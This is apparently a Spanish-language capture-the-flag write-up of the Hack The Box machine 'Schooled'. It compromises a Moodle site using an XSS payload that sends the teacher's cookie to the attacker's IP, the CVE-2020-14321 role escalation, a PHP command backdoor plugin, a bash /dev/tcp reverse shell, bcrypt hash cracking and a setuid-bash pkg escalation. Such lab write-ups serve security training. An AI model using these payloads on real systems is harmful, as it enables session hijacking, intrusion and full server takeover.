---
layout: single
title: Schooled - Hack The Box
excerpt: "Explotacion del CMS educativo Moodle"
date: 2018-11-24
classes: wide
header:
  teaser: /assets/images/htb-incpetion/inception1.png
categories:
  - hackthebox
  - writeup
tags:
  - hackthebox
  - Moodle
---

# 10.10.10.234 - Schooled

![](/assets/images/htb-schooled/schooled1.png)

---------------------------

# Part 1: Reconocimiento

Puertos abiertos: 22(ssh), 80(http)

```console
└─$ whatweb http://10.10.10.234
http://10.10.10.234 [200 OK] Apache[2.4.46], Bootstrap, Email[#,admissions@schooled.htb], HTML5, HTTPServer[FreeBSD][Apache/2.4.46] PHP[7.4.15], Script, Title[Schooled - A new kind of educational institute]
```
![](/assets/images/htb-schooled/schooled2.PNG)

La maquina por tanto se llama schooled.htb (modificar el /etc/hosts)
Hay una seccion de contacto, intento hacer un xss.

![](/assets/images/htb-schooled/schooled3.PNG)

La peticion es un /POST a contact.php. Pero por el servidor de python no recibo ninguna peticion.
Hay una serie de usuarios en la web, en vez de copiarlos a mano, tiramos de trucos de bash:
```console
└─$ curl -s http://10.10.10.234/teachers.html | html2text | grep -P "\*\*\* .*?" | sort -u | tr -d "*" > users.txt
# Quitamos algunas lineas como "Contact Details"
```
Tambien algo de fuzzing para descubrir subdirectorios.
```console
└─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.234/FUZZ/
000000536:   200        25 L     68 W       1048 Ch     "css"                                                
000000939:   200        16 L     41 W       522 Ch      "js"                                                 
000000002:   200        55 L     158 W      2440 Ch     "images"                                             
000002757:   200        20 L     53 W       838 Ch      "fonts"    
└─$ gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 200 -u http://schooled.htb
Found: moodle.schooled.htb (Status: 200) [Size: 84]
```

En el directorio /js está todo el codigo fuente, pero no hay nada interesante. Luego está el subdominio **moodle**.
Me han pedido que me registre -> cucuxii : Cucuxii123@ : cucuxii@student.schooled.htb

![](/assets/images/htb-schooled/schooled4.PNG)

Una vez registrado hay una seccion donde puedes subir archivos pero no hay manera de acceder a ellos, simplemente lo guarda (intenté subir un cmd.php)
En el botón **Site-home** hay cursos disponibles para iniciar, Es de un tal Michael Fillips (uno de los usaurios que obtuvimos antes). Una vez nos metemos en ese
curso, hay una seccion de anuncios:
```
Este es un curso al que uno se puede apuntar por su cuenta, para todos los que quieran mis lecciones, que se hagan
un perfil de MoodleNet.
Los que no lo tengan serán borrados, YO ESTARÉ REVISANDO a todos los estudiantes
```
---------------------------

# Part 2: Escalada a profesor con cookie hijacking

Cuando tenemos a otra persona que va a revisar algo nuestro podemos pensar en ataques XSS (ejemplo robo de cookie):

![](/assets/images/htb-schooled/schooled5.PNG)

```console
└─$ sudo python3 -m http.server 80
10.10.10.234 - - [01/Nov/2022 13:22:52] code 404, message File not found
10.10.10.234 - - [01/Nov/2022 13:22:52] "GET /pwned.js HTTP/1.1" 404
```
Nuevo payload -> robo de cookie
```<script>document.location=”http://10.10.14.6/?cookie=” + document.cookie</script>```

No recibimos nada, pero sabemos que este hombre se come todo el javascript que le mandemos
```js
var req1 = new XMLHttpRequest();  // Nueva peticion "req1"
req1.open("GET", "http://10.10.14.6/?cookie=" + document.cookie, false);   // Que visite tu servidor y te mande la cookie con el parametro cookie
req1.send();   // hacer la peticion 
```
Nos salta esto:
```
10.10.10.234 - - [01/Nov/2022 13:37:22] "GET /?cookie=MoodleSession=u2ocqtkbdqpr7sqg4rf0lq0of7 HTTP/1.1" 200 -
```
Cambiamos nuestra cookie por la suya y ya estamos bajo su perfil.

![](/assets/images/htb-schooled/schooled6.PNG)


En el calendario no hay nada interesante y en archivos tampoco. Si miramos su perfil nos da el correo
```phillips_manuel@staff.schooled.htb``` El nuestro era simplemente: **student.schooled.htb**

Si ponemos esto en el */etc/hosts* y accedemos a ```http://staff.schooled.htb```, pero es lo mismo que la 
**schooled.htb** original.

No se que más hacer, en searchsploit hay muchas versiones del moodles, asi que hay que buscar su version.
Si buscamos en google ```moodle RCE teacher``` leyendo resulta que en moodle hay que pasar de profesor a manager. 
```moodle privilege escalation from teacher to manaher``` nos da a la vuln **CVE-2020-14321**, acabando en este 
[exploit](https://github.com/HoangKien1020/CVE-2020-14321), Tiene hasta un video de vimeo donde lo explica.

---------------------------

# Part 3: Escalada a manager

Utilizamos todo el rato este [exploit](https://github.com/HoangKien1020/CVE-2020-14321)

No sabemos quien es el manager, pero tenemos un listado de usaurios y la parte de ver usaurios:    
```http://moodle.schooled.htb/moodle/user/profile.php?id=10``` -> cambiando el id podemos viajar entre usuarios. El 1 correspondiente a 1 no nos lo deja ver.
Se supone que es el del manager.   
En ```http://schooled.htb/teachers.html``` dice que es manager asi que es está a quien hay que secuestrarle la sesión.
En el exploit mencionan la ruta ```/enrol/manual/ajax.php``` La ruta nos dice que fatla el parametro id.

En el video del repositorio hablan de en cursos, (en nuestro caso Matematicas) en la seccion de participantes, darle a **Enroll user** y escoger a Lianne, luego
interceptar la peticion y cambiar estos parametros -> userlist de 25 a 24 (el id de nuestro Michael) y en role to assign 1, de administrador. Es decir, le 
hemos dado el privilegio de administrador a nuestro profesor de cierta manera.

![](/assets/images/htb-schooled/schooled7.PNG)
![](/assets/images/htb-schooled/schooled8.PNG)

Una vez hecho esto, la lista permanece intacta pero si añadimos otra vez a Lianne (sin cambiar nada) y nos  metemos en su perfil, desde la lista, nos saldrá la 
opción de registranos como ella.

Este ataque se llama MASS ASIGNMENT ATTACK y se suele dar muchas veces en apis, cuando hay una peticion para cambiar una cosa, puedes cambiar mas de las que 
estaba previsto.

En la seccion de Administracion, en Plugins no podemos subir nada.

![](/assets/images/htb-schooled/schooled9.PNG)

En la pagina del exploit de antes había una seccion que hablaba de permisos (payload to full permissions).  
Lo que hay que hacer es irse a Users -> Permissions -> define roles -> Manager -> edit   
  
![](/assets/images/htb-schooled/schooled10.PNG)

Ahi te salen todos los permisos, si le das a **save changes** interceptando la peticion y pones lo que sale en la web:  
```&return=manage&resettype=none&shortname=manager&name=&description=&archetype=manager&contextlevel10=0&n...```
manteniendo la sesskey, podras editar los plugins.

![](/assets/images/htb-schooled/schooled11.PNG)

Te pide un zip, pero el repo del exploit también te lo da.
Una vez subido, accedes a la ruta ```http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id```
(luego descomprimi el zip para ver que tenia y era el clasico backdoor en php ```<?php system($_GET['cmd']); ?>```)

![](/assets/images/htb-schooled/schooled12.PNG)

Y pones el comando para la reverse shell con los & urlencodeados a %26
```bash -c 'bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261'``` y netcat ```sudo nc -nlvp 443```

---------------------------

# Part 4: Accediendo al sistema

Tenemos una consola, pero no nos deja crear una tty ni hay curl o wget para subir un script de reconocimiento.
```console
[www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ script /dev/null -c bash
script: tcgetattr/ioctl: Can't assign requested address
```
En la carpeta de moodle se buscan posibles contraseñas: 
```console
[www@Schooled /usr/local/www/apache24/data/moodle]$ grep pass *
config.php:$CFG->dbpass    = 'PlaybookMaster2020';
[www@Schooled /usr/local/www/apache24/data/moodle]$ cat config.php | grep "user"
$CFG->dbuser    = 'moodle';
[www@Schooled /usr/local/www/apache24/data/moodle]$ mysql -u moodle -p 
bash: mysql: command not found
```
Apenas hay ningun programa, miramos el PATH a ver si es un problema suyo.
```console
[www@Schooled /usr/local/www/apache24/data/moodle]$ echo $PATH
/sbin:/bin:/usr/sbin:/usr/bin
[www@Schooled /usr/local/www/apache24/data/moodle]$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
[www@Schooled /usr/local/www/apache24/data/moodle]$ mysql -u moodle -p
PlaybookMaster2020
```
Como no estamos en un tty ha petado (al igual que nano y mas programas)

```console
[www@Schooled /home]$ mysql -umoodle -pPlaybookMaster2020 -e "show databases"
Database
information_schema
moodle
[www@Schooled /home]$ mysql -umoodle -pPlaybookMaster2020 -e "use moodle; show tables" | grep "user"
mdl_user
mdl_user_devices
mdl_user_enrolments
mdl_user_info_category
[www@Schooled /home]$ mysql -umoodle -pPlaybookMaster2020 -e "use moodle; describe mdl_user" | grep -E "pass|name"
username	varchar(100)	NO			
password	varchar(255)	NO
[www@Schooled /home]$ mysql -umoodle -pPlaybookMaster2020 -e "use moodle; select username,password,email from mdl_user"
admin	$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW jamie@staff.schooled.htb
```
Este hash se intenta romper con jhon, pero tarda una eternidad
```
└─$ hashcat --example-hashes | grep "\$2a" -B 2
MODE: 3200
TYPE: bcrypt $2*$, Blowfish (Unix)
HASH: $2a$05$MBCzKhG1KhezLh.0LRa0Kuw12nLJtpHy6DIaU.JAnqJUDYspHC.Ou
└─$ john hash -w=/usr/share/wordlists/rockyou.txt --format=bcrypt
!QAZ2wsx	(admin)
```
---------------------------

# Part 5: Escalando a root

Pero podemos hacer ssh -> ```ssh jamie@10.10.10.234```
```console
jamie@Schooled:/home $ sudo -l 
    (ALL) NOPASSWD: /usr/sbin/pkg update
    (ALL) NOPASSWD: /usr/sbin/pkg install *
```
En [gfobins](https://gtfobins.github.io/gtfobins/pkg/) nos dicen que con un programa llamado fpm realicemos una serie de comandos, como aqui no está se hace en la
maquina atacante (ya que generan un archivo que luego se puede subir a esta)
```console
└─$ sudo gem install fpm
└─$ TF=$(mktemp -d)
└─$ echo 'chmod u+s /bin/bash' > $TF/x.sh
└─$ fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
jamie@Schooled:/tmp $ sudo /usr/sbin/pkg install -y --no-repo-update ./x-1.0.txz
jamie@Schooled:/tmp $ bash -p
[jamie@Schooled /tmp]# whoami
root
```